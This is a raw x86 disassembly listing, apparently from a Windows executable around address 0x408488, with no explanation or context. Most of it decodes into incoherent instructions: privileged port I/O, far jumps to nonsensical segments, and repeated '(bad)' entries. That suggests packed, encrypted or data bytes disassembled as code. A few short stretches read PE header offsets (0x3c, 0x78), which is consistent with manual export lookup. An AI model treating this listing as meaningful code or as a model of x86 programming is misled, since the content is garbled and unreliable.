  408488:	mov    edx,?
  40848a:	mov    edx,0x3536bd63
  40848f:	cmc    
  408490:	loop   0x40842c
  408492:	jae    0x4084f0
  408494:	aas    
  408495:	fist   WORD PTR [ecx]
  408497:	inc    esp
  408498:	mov    ch,0xfe
  40849a:	add    esp,DWORD PTR [esi]
  40849c:	or     BYTE PTR [bx+di-0x57e6],ch
  4084a1:	pop    esp
  4084a2:	mov    esp,0x9dbcf90a
  4084a7:	sub    eax,0x48555ad4
  4084ac:	cmp    eax,0xb3a1d8af
  4084b1:	and    BYTE PTR [esi],cl
  4084b3:	int3   
  4084b4:	or     BYTE PTR [edx],bl
  4084b6:	pop    ecx
  4084b7:	mov    dh,0xb6
  4084b9:	es mov ss,edx
  4084bc:	and    ebx,DWORD PTR [eax-0x36]
  4084bf:	in     eax,dx
  4084c0:	xor    eax,0xe7a42373
  4084c5:	std    
  4084c6:	cmp    edx,DWORD PTR [ebp+0x3a]
  4084c9:	jmp    0x408452
  4084cb:	std    
  4084cc:	loop   0x408531
  4084ce:	xor    al,0x48
  4084d0:	xchg   edi,eax
  4084d1:	retf   0x35ed
  4084d4:	pop    ecx
  4084d5:	push   ds
  4084d6:	stc    
  4084d7:	jno    0x4084f8
  4084d9:	inc    ebp
  4084da:	jl     0x4084d6
  4084dc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084dd:	out    0x4c,al
  4084df:	fdiv   QWORD PTR [ecx+0x258710f]
  4084e5:	push   ds
  4084e6:	inc    edx
  4084e7:	lahf   
  4084e8:	lds    edx,FWORD PTR [esi+0x38]
  4084eb:	push   eax
  4084ec:	hlt    
  4084ed:	into   
  4084ee:	sbb    BYTE PTR [edx-0x51b8c0c6],bh
  4084f4:	pop    ds
  4084f5:	push   ebp
  4084f6:	sbb    ebp,DWORD PTR ds:0x7b1d5529
  4084fc:	push   0x4b
  4084fe:	out    dx,al
  4084ff:	mov    ch,0xa
  408501:	shl    BYTE PTR [edx+0x5de0338a],cl
  408507:	repnz dec eax
  408509:	rol    BYTE PTR [esi],cl
  40850b:	xchg   DWORD PTR [ebx],edx
  40850d:	push   0xffffffc3
  40850f:	in     al,dx
  408510:	scas   al,BYTE PTR es:[edi]
  408511:	jns    0x408540
  408513:	adc    DWORD PTR [esi+0x45],0xffffffb7
  408517:	xor    eax,0x9471a9fc
  40851c:	jmp    0xe33d:0x23c72f79
  408523:	addr16 jne 0x40850b
  408526:	dec    eax
  408527:	loope  0x40851e
  408529:	fsub   DWORD PTR [ebx-0x54cd34c0]
  40852f:	add    ch,al
  408531:	mov    eax,0xb6e21b27
  408536:	mov    dl,0x71
  408538:	fcomi  st,st(3)
  40853a:	mov    edi,DWORD PTR [ecx+ecx*2-0x5f]
  40853e:	cmp    al,0x1e
  408540:	sbb    eax,0x70d0f6a0
  408545:	out    dx,al
  408546:	inc    edx
  408547:	jge    0x40851b
  408549:	(bad)  
  40854a:	arpl   WORD PTR [ebp+0x4c3a87d9],bx
  408550:	mov    al,ds:0x223c7e0c
  408555:	jae    0x4085c4
  408557:	imul   edx,DWORD PTR [ecx+0x90996e4],0x4d944cf9
  408561:	out    dx,eax
  408562:	out    dx,eax
  408563:	dec    esp
  408564:	mov    bh,0x59
  408566:	dec    esi
  408567:	xchg   ebp,eax
  408568:	stos   BYTE PTR es:[edi],al
  408569:	pusha  
  40856a:	adc    DWORD PTR [ecx+edi*2+0x464f68e1],eax
  408571:	pop    ss
  408572:	cmp    dl,dl
  408574:	xor    DWORD PTR [ecx+ebx*2+0x7cde57c8],edi
  40857b:	mov    edi,0x3fc8a2d9
  408580:	cdq    
  408581:	out    0x85,eax
  408583:	xchg   edx,eax
  408584:	jbe    0x408547
  408586:	inc    esi
  408587:	jmp    0x69bf:0xb17c415b
  40858e:	hlt    
  40858f:	inc    edi
  408590:	mov    ecx,0x7267d670
  408595:	add    BYTE PTR [edx-0x5fe2f62e],bh
  40859b:	cmp    eax,DWORD PTR [edi+0x37]
  40859e:	call   0xc8cc:0x3c153e20
  4085a5:	pop    edi
  4085a6:	mov    ebx,DWORD PTR [esi-0x2e3b9936]
  4085ac:	inc    eax
  4085ad:	sbb    esp,edi
  4085af:	xchg   esi,eax
  4085b0:	jne    0x408554
  4085b2:	cmp    al,0x77
  4085b4:	sbb    al,0xfc
  4085b6:	mov    edx,0x26a8c00f
  4085bb:	inc    esp
  4085bc:	pop    ebx
  4085bd:	push   edx
  4085be:	xchg   ecx,eax
  4085bf:	je     0x408612
  4085c1:	shl    BYTE PTR [ebx],1
  4085c3:	cmovb  ecx,DWORD PTR [eax+0x4c30f8ad]
  4085ca:	inc    dh
  4085cc:	add    al,0xd0
  4085ce:	shl    DWORD PTR [eax],cl
  4085d0:	cmp    ecx,DWORD PTR [edi]
  4085d2:	shr    BYTE PTR [ebx+0x66],0xe7
  4085d6:	nop
  4085d7:	inc    ecx
  4085d8:	cld    
  4085d9:	(bad)  
  4085da:	xor    BYTE PTR ds:0xe8fe0238,ch
  4085e0:	ficom  WORD PTR [ebx+0x3c]
  4085e3:	repz cwde 
  4085e5:	not    DWORD PTR [ebp-0x4ee57f7b]
  4085eb:	inc    edx
  4085ec:	std    
  4085ed:	jge    0x4085cd
  4085ef:	sbb    BYTE PTR [esi-0x37],al
  4085f2:	les    ecx,FWORD PTR [edi]
  4085f4:	shl    DWORD PTR [esi+0x2db41c79],1
  4085fa:	or     DWORD PTR [eax-0x38],0xffffffab
  4085fe:	sbb    edi,edi
  408600:	xchg   esi,eax
  408601:	fwait
  408602:	lahf   
  408603:	clc    
  408604:	out    dx,eax
  408605:	int3   
  408606:	mov    ah,al
  408608:	cdq    
  408609:	shr    ah,1
  40860b:	lock mov ecx,0x46ab14a0
  408611:	iret   
  408612:	sbb    ch,0xf2
  408615:	clc    
  408616:	ds rcl bl,cl
  408619:	push   esp
  40861a:	push   esi
  40861b:	sbb    eax,0xcf35057c
  408620:	test   DWORD PTR [eax-0x4b1f7247],edi
  408626:	xchg   ebp,eax
  408627:	xchg   edi,eax
  408628:	stos   BYTE PTR es:[edi],al
  408629:	push   esp
  40862a:	mov    edi,ds
  40862c:	das    
  40862d:	mov    eax,ds:0xeef30f78
  408632:	inc    eax
  408633:	dec    ebx
  408634:	loop   0x408662
  408636:	iret   
  408637:	mov    esp,0xa0f9a603
  40863c:	and    BYTE PTR [esi+0x6a],bl
  40863f:	or     DWORD PTR [esi-0x3f],eax
  408642:	mov    bl,0xed
  408644:	mov    esi,DWORD PTR [edi]
  408646:	mov    ebx,0x2789499b
  40864b:	adc    al,0xf6
  40864d:	xor    ebx,DWORD PTR [ebp+0x3e]
  408650:	and    ebp,DWORD PTR [ebx+0x19]
  408653:	aam    0xd6
  408655:	jne    0x408667
  40865b:	mov    eax,DWORD PTR [ebp-0x64]
  40865e:	cmp    DWORD PTR [ebp-0x5c],eax
  408661:	je     0x408e5e
  408667:	mov    eax,DWORD PTR [ebp+0x8]
  40866a:	mov    edx,DWORD PTR [ebp+0xc]
  40866d:	mov    edx,DWORD PTR [ebp-0x4]
  408670:	mov    edx,DWORD PTR [edx+0x3c]
  408673:	lea    eax,[edx+eax*8+0x78]
  408677:	mov    edx,DWORD PTR [ebp-0x4]
  40867a:	mov    eax,DWORD PTR [edx+eax*1]
  40867d:	mov    DWORD PTR [ebp-0x24],eax
  408680:	jmp    0x408a5e
  408685:	or     ah,BYTE PTR [ebx+0x79]
  408688:	jns    0x4086eb
  40868a:	arpl   WORD PTR [edx],cx
  40868c:	pop    ebx
  40868d:	fadd   QWORD PTR [ebx+0x2f]
  408690:	mov    esi,0xaa2970c0
  408695:	das    
  408696:	pop    edi
  408697:	sbb    BYTE PTR [eax],bl
  408699:	sahf   
  40869a:	adc    bl,BYTE PTR [eax]
  40869c:	sbb    cl,ah
  40869e:	or     BYTE PTR [esi+0x27],0x85
  4086a2:	stos   DWORD PTR es:[edi],eax
  4086a3:	shr    bl,cl
  4086a5:	jne    0x4086ec
  4086a7:	xchg   ecx,eax
  4086a8:	mov    ebx,0x61b1a16e
  4086ad:	shl    DWORD PTR [esi+0x46],cl
  4086b0:	push   eax
  4086b1:	xor    ebx,edx
  4086b3:	test   eax,0x1d696204
  4086b8:	jo     0x408723
  4086ba:	in     eax,0x9a
  4086bc:	loope  0x408691
  4086be:	cli    
  4086bf:	out    0x8b,eax
  4086c1:	mov    al,ds:0xf4633814
  4086c6:	aad    0x6f
  4086c8:	(bad)  
  4086ca:	dec    ecx
  4086cb:	xor    DWORD PTR [esi-0xa55a8a],esp
  4086d1:	mov    edx,0xbc775375
  4086d6:	xchg   BYTE PTR [ebp+0x2b14903a],dl
  4086dc:	mov    ah,0xa6
  4086de:	jp     0x408669
  4086e0:	or     dl,BYTE PTR [edi+0x8]
  4086e3:	push   0xffffffbe
  4086e5:	mov    edi,0x27886ad2
  4086ea:	and    ecx,DWORD PTR [edi+0x45f85fde]
  4086f0:	(bad)  
  4086f1:	jg     0x4086e9
  4086f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4086f4:	adc    DWORD PTR [ebx-0x19],0x5c
  4086f8:	fidivr WORD PTR [esi-0x18]
  4086fb:	inc    esi
  4086fc:	jmp    0x52295915
  408701:	sbb    ebx,DWORD PTR [ecx-0x55]
  408704:	(bad)  
  408706:	imul   ecx,DWORD PTR [esp+edx*4],0x18fc30f8
  40870d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40870e:	push   0xefd2aa40
  408713:	ja     0x4086f9
  408715:	inc    ebx
  408716:	or     eax,0xe4616954
  40871b:	push   cs
  40871c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40871d:	std    
  40871e:	std    
  40871f:	and    BYTE PTR [ecx],dh
  408721:	fmul   QWORD PTR [ebp+0x26f1acaa]
  408727:	push   eax
  408728:	sub    al,0x2f
  40872a:	loopne 0x408708
  40872c:	call   0xa3d0caad
  408731:	sub    eax,ecx
  408733:	cwde   
  408734:	sbb    BYTE PTR [edx-0x62],ch
  408737:	int3   
  408738:	sbb    DWORD PTR [eax-0x3a2e5e38],esi
  40873e:	pop    ecx
  40873f:	cmp    BYTE PTR [edi+ecx*4],al
  408742:	fsubr  QWORD PTR [ebp-0x608ce46f]
  408748:	fmul   DWORD PTR [eax+edi*4+0x284b48e2]
  40874f:	mov    dh,0x47
  408751:	mov    esi,0xd13a57a4
  408756:	ret    
  408757:	xchg   edi,eax
  408758:	adc    ch,BYTE PTR [esi]
  40875a:	sub    DWORD PTR [eax+0x1a],0x31
  40875e:	cwde   
  40875f:	imul   ecx,DWORD PTR [edi+0x6b],0x6e
  408763:	sub    eax,0xd8aaea60
  408768:	imul   ebp
  40876a:	mov    DWORD PTR [ecx-0x604b26be],0xd735274
  408774:	mov    ah,0x54
  408776:	into   
  408777:	ret    
  408778:	push   edi
  408779:	scas   al,BYTE PTR es:[edi]
  40877a:	in     al,dx
  40877b:	retf   
  40877c:	cmp    al,BYTE PTR [esi+0x3755f1fa]
  408782:	xchg   edi,eax
  408783:	gs push edx
  408785:	sahf   
  408786:	jae    0x4087ae
  408788:	add    eax,0xa6d8f147
  40878d:	scas   al,BYTE PTR es:[edi]
  40878e:	fld    TBYTE PTR [ebx-0x24]
  408791:	aad    0x2
  408793:	xor    eax,0x69a227a8
  408798:	test   DWORD PTR [ecx],edx
  40879a:	xor    dh,BYTE PTR [ecx-0x63e6a7ef]
  4087a0:	xchg   ebx,eax
  4087a1:	dec    eax
  4087a2:	xchg   DWORD PTR [eax+0x72634665],edi
  4087a8:	shl    BYTE PTR [edx+eax*4+0x50],cl
  4087ac:	jle    0x408755
  4087ae:	dec    eax
  4087af:	aad    0x5
  4087b1:	adc    eax,DWORD PTR [ebp-0x35]
  4087b4:	cwde   
  4087b5:	sbb    BYTE PTR [edi],ah
  4087b7:	mov    eax,0xada34bcf
  4087bc:	(bad)  
  4087bd:	call   0xd74a96da
  4087c2:	mov    edx,0x8e3c0b06
  4087c7:	jmp    esi
  4087c9:	cmp    BYTE PTR [ebx],cl
  4087cb:	jmp    0x20ce4853
  4087d0:	stos   BYTE PTR es:[edi],al
  4087d1:	(bad)  [ebx-0x1e]
  4087d4:	sbb    DWORD PTR [ebx-0x11],ebp
  4087d7:	or     DWORD PTR [ebx+ecx*8+0x29700525],ebx
  4087de:	mov    eax,0x8e459d4c
  4087e3:	pop    edi
  4087e4:	fs loop 0x408824
  4087e7:	rcr    DWORD PTR [ecx],0x4
  4087ea:	sbb    bh,dl
  4087ec:	ja     0x408841
  4087ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4087ef:	push   ecx
  4087f0:	push   eax
  4087f1:	ja     0x40884f
  4087f3:	enter  0xeee9,0xa9
  4087f7:	shl    DWORD PTR [edx-0x37],0xc5
  4087fb:	hlt    
  4087fc:	int3   
  4087fd:	int3   
  4087fe:	adc    BYTE PTR [eax],dh
  408800:	and    BYTE PTR [ecx-0x2f84c4be],cl
  408806:	cmp    eax,0x58366ab5
  40880b:	push   ecx
  40880c:	adc    BYTE PTR [edx+edx*1-0xb595635],bh
  408813:	fcom   st(7)
  408815:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408816:	mov    ch,BYTE PTR [edi+0x32]
  408819:	inc    esi
  40881a:	jge    0x4087a6
  40881c:	push   ds
  40881d:	outs   dx,DWORD PTR ds:[esi]
  40881e:	cmp    bl,BYTE PTR [esi+0x2c]
  408821:	enter  0x73f3,0xb3
  408825:	or     eax,0x27317728
  40882a:	imul   esp,DWORD PTR [ebx],0x42c65e20
  408830:	les    ecx,FWORD PTR [edx]
  408832:	and    BYTE PTR [edx+0x1e],bl
  408835:	fdiv   st,st(1)
  408837:	imul   esi,DWORD PTR [ecx-0x789f4fee],0x4c
  40883e:	or     DWORD PTR [ebx-0x5f6e747d],esi
  408844:	push   ebx
  408845:	shl    BYTE PTR [esi-0x44],1
  408848:	call   FWORD PTR [ebx]
  40884a:	pop    edx
  40884b:	mov    gs,WORD PTR [eax]
  40884d:	sub    edi,DWORD PTR [esi-0x6e965417]
  408853:	inc    esp
  408854:	rcr    ch,cl
  408856:	stos   BYTE PTR es:[edi],al
  408857:	(bad)  
  408858:	fild   DWORD PTR [eax+0x76388190]
  40885e:	inc    esp
  40885f:	jo     0x4088a3
  408861:	mov    bh,0x18
  408863:	dec    ebx
  408864:	scas   eax,DWORD PTR es:[edi]
  408865:	add    esp,edi
  408867:	(bad)  
  408868:	or     ah,BYTE PTR [esi-0x45]
  40886b:	inc    esi
  40886c:	out    dx,al
  40886d:	jp     0x408885
  40886f:	inc    ecx
  408870:	bound  edi,QWORD PTR [ebx+0x6b]
  408873:	daa    
  408874:	pop    ecx
  408875:	push   edx
  408876:	clc    
  408877:	out    0x23,eax
  408879:	xor    dl,BYTE PTR [edi-0x2eec65ba]
  40887f:	ins    BYTE PTR es:[edi],dx
  408880:	pusha  
  408881:	jae    0x408835
  408883:	pusha  
  408884:	pushf  
  408885:	sahf   
  408886:	cli    
  408887:	leave  
  408888:	fsubr  st,st(6)
  40888a:	ins    DWORD PTR es:[edi],dx
  40888b:	int3   
  40888c:	int3   
  40888d:	jl     0x40881e
  40888f:	cmp    eax,0xe517e4c6
  408894:	popa   
  408895:	and    BYTE PTR [esp+eax*4],dl
  408898:	sub    BYTE PTR [edi-0x37],bl
  40889b:	adc    BYTE PTR [esi+edi*4-0x53],dh
  40889f:	pop    edi
  4088a0:	mov    al,ds:0x120a41e
  4088a5:	xlat   BYTE PTR ds:[ebx]
  4088a6:	inc    ecx
  4088a7:	fsubp  st(5),st
  4088a9:	stos   DWORD PTR es:[edi],eax
  4088aa:	dec    eax
  4088ab:	sub    BYTE PTR [edx-0x55],0x31
  4088af:	inc    eax
  4088b0:	jmp    0x36f:0x9faf18ea
  4088b7:	test   eax,0x2496bcc1
  4088bc:	pop    esi
  4088bd:	pop    eax
  4088be:	and    al,0xd9
  4088c0:	fadd   QWORD PTR [ebp+0x6202bed6]
  4088c6:	mov    al,0xef
  4088c8:	ss push es
  4088ca:	mov    eax,ds:0x633721c
  4088cf:	jmp    0x4088f6
  4088d1:	stos   BYTE PTR es:[edi],al
  4088d2:	sbb    bh,ch
  4088d4:	fs data16 mov dh,0x16
  4088d8:	dec    edx
  4088d9:	or     al,0x65
  4088db:	and    eax,0x2e1faad1
  4088e0:	xor    eax,0x6225ede5
  4088e5:	clc    
  4088e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088e8:	and    BYTE PTR [ebx+0x46],dl
  4088eb:	push   esp
  4088ec:	cmp    al,0x33
  4088ee:	lock cmp cl,ch
  4088f1:	push   ebp
  4088f2:	adc    al,0xf2
  4088f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4088f5:	inc    ebx
  4088f6:	clc    
  4088f7:	push   cs
  4088f8:	test   DWORD PTR [ecx-0xb],ebp
  4088fb:	mov    ds:0xdc6930b7,al
  408900:	dec    esp
  408901:	icebp  
  408902:	pop    ebx
  408903:	add    al,0x98
  408905:	mov    ebx,0xd99fa980
  40890a:	sub    al,0x26
  40890c:	xchg   ebx,eax
  40890d:	inc    esi
  40890e:	(bad)  
  40890f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408910:	mov    dl,0x46
  408912:	xor    al,0xa6
  408914:	in     al,dx
  408915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408916:	add    bl,BYTE PTR [ecx]
  408918:	mov    ebx,0x717d7b12
  40891d:	dec    edx
  40891e:	cdq    
  40891f:	xchg   BYTE PTR [edx+0x4f42bec8],ch
  408925:	js     0x4088c9
  408927:	and    al,0xef
  408929:	(bad)  
  40892a:	pop    ds
  40892b:	inc    esi
  40892c:	mov    ebp,0xec40b7d3
  408931:	cmp    DWORD PTR [esi-0x70],ecx
  408934:	add    DWORD PTR [ebp+0x66],eax
  408937:	jl     0x408969
  408939:	data16 mov ds:0xc9f73643,al
  40893f:	ret    0xebda
  408942:	mov    BYTE PTR [esi+0x1f],0x4e
  408946:	ins    BYTE PTR es:[edi],dx
  408947:	jne    0x4088e6
  408949:	scas   eax,DWORD PTR es:[edi]
  40894a:	xchg   DWORD PTR [ecx-0xeaec240],eax
  408950:	hlt    
  408951:	jnp    0x40893c
  408953:	dec    BYTE PTR [ecx+0x2e]
  408956:	test   eax,0x29a2d0f0
  40895b:	xchg   esi,eax
  40895c:	pop    edx
  40895d:	(bad)
  408960:	lods   eax,DWORD PTR ds:[esi]
  408961:	and    eax,0x6bcc8244
  408966:	pop    edx
  408967:	adc    esi,edx
  408969:	ret    
  40896a:	inc    esp
  40896b:	sub    DWORD PTR [ebx-0x37],ebx
  40896e:	cmp    eax,0xc3dde1ef
  408973:	or     BYTE PTR [edi-0x5cade98c],0xd0
  40897a:	pop    edi
  40897b:	and    BYTE PTR [edx-0x40cb8f35],cl
  408981:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408982:	push   cs
  408983:	addr16 cmp al,0x3e
  408986:	es push eax
  408988:	clc    
  408989:	mov    bl,0xf4
  40898b:	pop    ds
  40898c:	cld    
  40898d:	stc    
  40898e:	jo     0x408a05
  408990:	inc    esi
  408991:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408992:	mov    esi,0xb300d1dd
  408997:	int3   
  408998:	fcom   QWORD PTR [eax]
  40899a:	ja     0x4089c6
  40899c:	sbb    eax,0x73c47604
  4089a1:	cmp    DWORD PTR [edi+0x6119d23e],0xedd7d3f9
  4089ab:	sbb    al,0x43
  4089ad:	jg     0x4089bb
  4089af:	fld    QWORD PTR [edx+ecx*8]
  4089b2:	ja     0x4089d9
  4089b4:	and    eax,0x7aa62988
  4089b9:	data16 cmc 
  4089bb:	mov    cl,0x39
  4089bd:	inc    esi
  4089be:	outs   dx,DWORD PTR ds:[esi]
  4089bf:	sbb    al,0x36
  4089c1:	sbb    DWORD PTR [ebx+ebx*1],edx
  4089c4:	(bad)  
  4089c5:	out    dx,al
  4089c6:	shl    BYTE PTR cs:[ebx],cl
  4089c9:	shr    BYTE PTR [ecx+ebp*8+0x36],cl
  4089cd:	xor    al,0x4a
  4089cf:	pop    ds
  4089d0:	scas   eax,DWORD PTR es:[edi]
  4089d1:	xor    eax,0xe7e5445e
  4089d6:	repz fadd st,st(0)
  4089d9:	push   edx
  4089da:	loopne 0x40896f
  4089dc:	inc    esp
  4089dd:	jb     0x4089ac
  4089df:	cmp    al,0x28
  4089e1:	icebp  
  4089e2:	stc    
  4089e3:	inc    esp
  4089e4:	pop    es
  4089e5:	mov    ebx,0x93104261
  4089ea:	and    al,0x97
  4089ec:	retf   
  4089ed:	cmp    eax,0x12829abb
  4089f2:	or     DWORD PTR [edx-0x716d926f],edi
  4089f8:	inc    ebx
  4089f9:	repz in al,dx
  4089fb:	sbb    bh,BYTE PTR [esp+ebp*1+0x7c]
  4089ff:	push   ecx
  408a00:	retf   
  408a01:	push   0x4b
  408a03:	or     DWORD PTR [edx-0x2d],edx
  408a06:	scas   al,BYTE PTR es:[edi]
  408a07:	xchg   edx,eax
  408a08:	dec    edi
  408a09:	cmp    bl,0x2b
  408a0c:	lds    eax,FWORD PTR [ecx]
  408a0e:	pop    ecx
  408a0f:	add    dl,BYTE PTR [esi-0x6c]
  408a12:	or     esp,edx
  408a14:	das    
  408a15:	in     al,0x69
  408a17:	or     DWORD PTR [ebx],esp
  408a19:	push   eax
  408a1a:	sbb    al,0x1b
  408a1c:	or     DWORD PTR [edi-0x7d],ecx
  408a1f:	add    dl,BYTE PTR [edx+edi*8]
  408a22:	mov    ebx,0xed0040f8
  408a28:	(bad)  
  408a29:	mov    ebp,0x18c724d0
  408a2e:	stos   DWORD PTR es:[edi],eax
  408a2f:	call   0x5ff3:0x4619a8f4
  408a36:	push   esp
  408a37:	sar    BYTE PTR [ecx],0x42
  408a3a:	jmp    0x68585c90
  408a3f:	popa   
  408a40:	push   0x1
  408a42:	arpl   ax,si
  408a44:	stos   DWORD PTR es:[edi],eax
  408a45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a46:	push   edx
  408a47:	sbb    al,0x6f
  408a49:	das    
  408a4a:	inc    edi
  408a4b:	pop    eax
  408a4c:	cmp    ebx,ebx
  408a4e:	pop    esi
  408a4f:	(bad)  
  408a50:	or     al,0xb2
  408a52:	inc    eax
  408a53:	jmp    0xde7e:0x759493fa
  408a5a:	add    al,ah
  408a5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408a5d:	inc    edi
  408a5e:	mov    eax,DWORD PTR [esi]
  408a60:	mov    edx,DWORD PTR [esi+0x4]
  408a63:	jmp    0x408e41
  408a68:	pop    ebx
  408a69:	jno    0x408ac9
  408a6b:	mov    ds:0x301ba25a,al
  408a70:	xchg   DWORD PTR es:[ebp-0x44],esp
  408a74:	das    
  408a75:	lods   eax,DWORD PTR ds:[esi]
  408a76:	mov    ds:0x1857b5bc,eax
  408a7b:	sbb    BYTE PTR [esi+0x29181812],bl
  408a81:	mov    eax,DWORD PTR [ecx+eiz*8-0x2c]
  408a85:	mov    ch,ch
  408a87:	push   esi
  408a88:	fisub  WORD PTR [eax]
  408a8a:	mov    ebx,0x5c348a55
  408a8f:	or     al,0x7b
  408a91:	xor    edi,DWORD PTR [ecx]
  408a93:	lods   al,BYTE PTR ds:[esi]
  408a94:	dec    esi
  408a95:	or     ebx,edi
  408a97:	ds sbb eax,0x32add2cb
  408a9d:	add    ebp,ecx
  408a9f:	jnp    0x408a75
  408aa1:	lds    edx,FWORD PTR [ebx-0x47]
  408aa4:	sahf   
  408aa5:	push   esi
  408aa6:	pop    eax
  408aa7:	mov    ebp,0x80b8ec58
  408aac:	out    dx,al
  408aad:	jns    0x408b08
  408aaf:	cmp    DWORD PTR [edi],edi
  408ab1:	fwait
  408ab2:	in     eax,dx
  408ab3:	pop    ebx
  408ab4:	jl     0x408a7e
  408ab6:	call   0xd7d0:0x3339fad2
  408abd:	jp     0x408b3e
  408abf:	rol    edx,cl
  408ac1:	xor    edx,DWORD PTR [ebp-0x2]
  408ac4:	and    DWORD PTR [eiz*8-0x13dcd733],esi
  408acb:	mov    ds:0x64c75685,eax
  408ad0:	sar    ah,cl
  408ad2:	xchg   ebp,eax
  408ad3:	pop    ebp
  408ad4:	cwde   
  408ad5:	addr16 push ds
  408ad7:	jmp    FWORD PTR [edx+0x19]
  408ada:	fwait
  408adb:	lock not BYTE PTR [ecx+0x1bcafbbd]
  408ae2:	pop    eax
  408ae3:	mov    dh,BYTE PTR [esi+0x69a53bc0]
  408ae9:	loope  0x408ae9
  408aeb:	mov    eax,0xd832d637
  408af0:	neg    ecx
  408af2:	mov    esi,0x8ac1b26a
  408af7:	vxorps xmm4,xmm1,XMMWORD PTR [esi+0x573eccbb]
  408aff:	daa    
  408b00:	cmc    
  408b01:	lock cwde 
  408b03:	inc    DWORD PTR [ebp+0x355dfcbb]
  408b09:	push   0x8993e9cd
  408b0e:	dec    DWORD PTR [ecx+0x7b]
  408b11:	sbb    ebx,0xaf7cc2cb
  408b17:	push   ds
  408b18:	jp     0x408abf
  408b1a:	test   BYTE PTR [edi],cl
  408b1c:	push   cs
  408b1d:	add    ebp,esp
  408b1f:	ds push edx
  408b21:	inc    edx
  408b22:	push   esi
  408b23:	inc    edx
  408b24:	in     al,dx
  408b25:	xchg   DWORD PTR [eax-0x5e],ebp
  408b28:	pop    edi
  408b29:	lea    esi,[ebp-0x43883406]
  408b2f:	imul   esi,DWORD PTR [ebp+esi*4-0x6330d3bc],0xc03aad9c
  408b3a:	lods   al,BYTE PTR ds:[esi]
  408b3b:	fcomp  st(7)
  408b3d:	ins    DWORD PTR es:[edi],dx
  408b3e:	push   es
  408b3f:	dec    esp
  408b40:	iret   
  408b41:	dec    ebx
  408b42:	imul   ebp,DWORD PTR [esi-0x1d],0x1ab38034
  408b49:	cmp    ah,dh
  408b4b:	rcl    bl,cl
  408b4d:	lods   al,BYTE PTR ds:[esi]
  408b4e:	or     al,0xce
  408b50:	(bad)  
  408b51:	sar    DWORD PTR [ebx],cl
  408b53:	cmp    eax,0xee7e5608
  408b58:	dec    edx
  408b59:	cs adc al,0x2
  408b5c:	pusha  
  408b5d:	leave  
  408b5e:	dec    esp
  408b5f:	sti    
  408b60:	xor    eax,0x9bb10e98
  408b65:	scas   al,BYTE PTR es:[edi]
  408b66:	jns    0x408b68
  408b68:	mov    ch,0x8d
  408b6a:	(bad)  
  408b6b:	mov    esi,esp
  408b6d:	xchg   BYTE PTR [ebx],dl
  408b6f:	sub    edi,esp
  408b71:	jecxz  0x408b97
  408b73:	retf   0xa71f
  408b76:	popa   
  408b77:	in     eax,dx
  408b78:	or     dl,BYTE PTR [edx-0x74]
  408b7b:	mov    bh,0xa4
  408b7d:	push   eax
  408b7e:	sbb    al,0x1f
  408b80:	mov    eax,eax
  408b82:	cs mov eax,DWORD PTR ss:[edi-0x78ea6462]
  408b8a:	mov    bl,0x37
  408b8c:	aad    0xb1
  408b8e:	fcomip st,st(7)
  408b90:	test   BYTE PTR [edi],cl
  408b92:	outs   dx,BYTE PTR ds:[esi]
  408b93:	stos   BYTE PTR es:[edi],al
  408b94:	ret    0x732e
  408b97:	pop    ecx
  408b98:	imul   ebp,DWORD PTR [ebp+0x5f828967],0x6eb49ccf
  408ba2:	in     eax,0xc3
  408ba4:	arpl   bx,si
  408ba6:	sub    ebp,esp
  408ba8:	sbb    bh,BYTE PTR ds:0x1d0350ec
  408bae:	cwde   
  408baf:	sub    BYTE PTR [ecx+0x3d],dl
  408bb2:	pop    eax
  408bb3:	or     dl,BYTE PTR [edi]
  408bb5:	aad    0x64
  408bb7:	fld    TBYTE PTR [eax]
  408bb9:	ficom  WORD PTR ds:0x33fef6ba
  408bbf:	imul   edi,DWORD PTR [edx+0x20819709],0xf45030e7
  408bc9:	xchg   esi,eax
  408bca:	fwait
  408bcb:	jmp    0x44c33073
  408bd0:	je     0x408bee
  408bd2:	test   BYTE PTR [eax+0x76],bh
  408bd5:	bound  edi,QWORD PTR [esi+0x10]
  408bd8:	idiv   dh
  408bda:	ins    DWORD PTR es:[edi],dx
  408bdb:	aad    0x64
  408bdd:	mov    edi,0xc12e72a8
  408be2:	add    ebx,0xffffff90
  408be5:	push   0x319d6349
  408bea:	add    DWORD PTR ds:0x5f82fca7,ecx
  408bf0:	push   edx
  408bf1:	in     eax,0xcf
  408bf3:	push   ds
  408bf4:	mov    al,ds:0x39857357
  408bf9:	mov    dh,0x90
  408bfb:	sar    DWORD PTR [eax],0x32
  408bfe:	scas   eax,DWORD PTR es:[edi]
  408bff:	sbb    al,0xd9
  408c01:	gs or  ebp,0x2
  408c05:	add    DWORD PTR ds:[eax-0x2d],esi
  408c09:	mov    eax,ds:0x9f66d1ff
  408c0e:	les    ebx,FWORD PTR [ebx]
  408c10:	lea    edi,[esi]
  408c12:	ret    
  408c13:	add    al,0xb6
  408c15:	add    dl,ch
  408c17:	(bad)  
  408c18:	out    dx,eax
  408c19:	and    BYTE PTR [ebp-0x594bebc0],ch
  408c1f:	mov    edi,0x3d216117
  408c24:	fimul  WORD PTR [ebx]
  408c26:	lods   al,BYTE PTR ds:[esi]
  408c27:	xchg   esi,eax
  408c28:	lea    esi,[esi+ebx*8]
  408c2b:	sbb    DWORD PTR [edx+0x3d32f58e],0xffffff99
  408c32:	in     al,0x4
  408c34:	mov    esp,0xa810f8b7
  408c39:	(bad)  
  408c3a:	outs   dx,DWORD PTR ds:[esi]
  408c3b:	out    dx,eax
  408c3c:	addr16 cld 
  408c3e:	js     0x408c79
  408c40:	jecxz  0x408bf3
  408c42:	aaa    
  408c43:	pushf  
